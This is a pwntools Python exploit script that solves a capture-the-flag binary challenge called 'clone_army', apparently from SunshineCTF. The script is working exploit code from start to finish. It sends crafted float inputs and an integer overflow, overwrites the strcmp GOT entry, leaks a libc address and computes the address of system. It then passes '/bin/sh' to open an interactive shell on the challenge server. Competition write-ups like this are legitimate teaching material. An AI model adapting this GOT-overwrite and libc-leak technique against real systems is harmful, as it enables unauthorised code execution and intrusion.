#!/usr/bin/env python3

from pwn import *
import resource

exe = ELF("clone_army_patched")
libc = ELF("libc.so.6")
ld = ELF("ld.so")

context.binary = exe
context.terminal = ["alacritty", "-e"]

NC_CMD = "nc chal.sunshinectf.games 25001 "
gdbscript = \
"""
b *make_clones+232
"""

def set_limits():
    data_limit_bytes = 512 * 1024 * 1024
    resource.setrlimit(resource.RLIMIT_AS, (data_limit_bytes, data_limit_bytes))

def conn():
    if args.LOCAL:
        r = process([exe.path], preexec_fn=set_limits)
    elif args.GDB:
        r = gdb.debug([exe.path], gdbscript=gdbscript, aslr=True, preexec_fn=set_limits)
    else:
        r = remote(NC_CMD.split(" ")[1], int(NC_CMD.split(" ")[2]))

    return r

import struct

def i2f(i):
    return struct.unpack('>f', struct.pack('>I', i))[0]

def main():
    r = conn()

    r.sendlineafter(b">", b"yes")

    r.sendlineafter(b">", str(i2f(0)/0.3048).encode())
    r.sendlineafter(b">", str(i2f(0x403A0)/0.45359999).encode())
    r.sendlineafter(b">", str(i2f(0x403A0)*100.0).encode())
    
    r.sendlineafter(b"?", b"yes")

    r.sendlineafter(b"?", str(0x403A9).encode())
    r.sendlineafter(b"?", b"yes")

    overflow = (1<<32)//2 - 1
    r.sendlineafter(b"?", str(overflow).encode())
    r.sendlineafter(b"?", b"no")

    r.sendlineafter(b"?", b"yes\n0")
    r.sendlineafter(b"?", b"1")
    got_remote_off = 24
    if args.LOCAL or args.GDB:
        got_remote_off = 8
    r.sendlineafter(b"?", str(exe.got.strcmp-got_remote_off).encode())

    r.sendlineafter(b"?", b"no")
    r.sendlineafter(b"?", b"2")
    r.sendlineafter(b"?", str(i2f(0)).encode())

    r.sendlineafter(b"?", b"yes")
    r.sendlineafter(b"?", b"yes")
    r.sendlineafter(b"?", b"0")
    # 0xbf5a2ed0
    r.recvuntil(b"soldier #")
    libc_low_word = int(r.recvuntil(b"'", drop=True)) - libc.sym.fgets
    log.info(f"libc leak: {hex(libc_low_word)}")

    libc_system = libc_low_word + libc.sym.system

    r.sendlineafter(b"?", b"3")
    print(hex(libc_system))
    r.sendlineafter(b"?", str(i2f(libc_system)/0.45359999).encode())

    r.sendlineafter(b"?", b"/bin/sh")

    r.interactive()


if __name__ == "__main__":
    main()